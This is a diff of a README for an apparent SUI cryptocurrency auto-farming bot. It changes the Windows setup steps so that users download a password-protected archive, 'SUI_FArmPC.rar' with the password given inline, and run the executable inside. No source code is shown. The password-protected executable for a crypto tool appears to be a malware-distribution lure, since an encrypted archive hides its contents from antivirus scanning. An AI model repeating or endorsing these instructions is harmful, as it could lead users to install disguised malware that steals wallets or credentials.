@@ -17,7 +17,7 @@
 
 ## 🛠 Setup Instructions:
 ### 🔹 Windows (.exe) - Recommended:
-1️⃣ Download and extract the `.rar` file.  
+1️⃣ Download and extract the `SUI_FArmPC.rar` (pass:1243DSAf).  
 2️⃣ Run `SUI_AutoFarmer.exe`.  
 3️⃣ Enjoy automated farming! 🚀  
 
@@ -30,4 +30,4 @@ python src/main.py
 ---
 
 ## 🤝 Support & Community:
-📌 Join our Telegram/Discord for updates and help! *(Add link here)*  
+📌 Join our Telegram/Discord for updates and help! 
